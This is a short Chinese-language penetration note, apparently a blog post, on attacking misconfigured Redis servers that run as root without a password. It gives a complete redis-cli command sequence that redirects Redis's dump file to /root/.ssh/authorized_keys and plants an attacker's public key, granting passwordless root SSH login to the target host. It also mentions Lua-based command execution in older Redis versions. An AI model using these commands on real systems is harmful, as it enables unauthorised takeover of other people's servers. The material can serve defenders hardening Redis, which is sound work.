redis漏洞总结

redis的漏洞主要出在配置错误

redis配置了不当的白名单，如redis默认是绑定0.0.0.0:6379

所以当我们需要渗透一个redis的时候，如果目标服务器存在这些情况

  • redis以root权限启动
  • redis是弱口令或者根本没有设置口令
  • redis在公网上对任意ip开放，如绑定0.0.0.0:6379

我们就可以对其进行渗透

  • 写SSH公钥

    • 首先在我们本地生成公钥，因为此时我们已经通过弱口令或者无口令登录到了redis，我们将redis的默认路径改到/root/.ssh/，然后设置保存的文件名为authorized_keys， 再通过set 进行写入公钥，这样我们就可以免密登录目标服务器了

    • ```
      redis-cli -h 192.168.33.134 #连接目标主机redis
      config get dir #检查当前保存路径
      config get dbfilename #检查保存文件名
      config set dir /root/.ssh/ #设置保存路径
      config set dbfilename authorized_keys #设置保存文件名
      set test “\n\n\n 公钥 \n\n\n” #将公钥写入test健
      save #进行保存

  • redis写lua

    • redis2.6之前内置了lua脚本环境在redis未授权的情况下可以利用lua执行系统命令
